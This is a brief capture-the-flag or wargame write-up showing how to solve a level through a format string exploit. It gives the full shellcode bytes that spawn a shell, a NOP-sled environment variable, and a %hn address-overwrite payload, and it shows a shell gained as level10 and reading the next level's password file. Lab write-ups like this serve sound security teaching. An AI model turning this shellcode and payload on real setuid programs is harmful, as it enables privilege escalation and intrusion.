# Writeup

Simple format string exploitation.
We'll use this shellcode:

http://shell-storm.org/shellcode/files/shellcode-399.php

export SHELLCODE=$(printf "\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")

Let's not forget to :
```
(gdb) unset env LINES
(gdb) unset env COLUMNS
```
so we get the same addresses in gdb as in the regular console.
Then we play a bit 'till we find the address of our env variable string just after the *SHELLCODE=* which is the beginning of our nopsled.

/levels/level09  $(python -c 'print "\xee\xfb\xff\xbf" + "\xec\xfb\xff\xbf" + "%049143x" + "%4$hn" + "%015864x" + "%5$hn"')

$ whoami
level10
$ cat ~/.pass
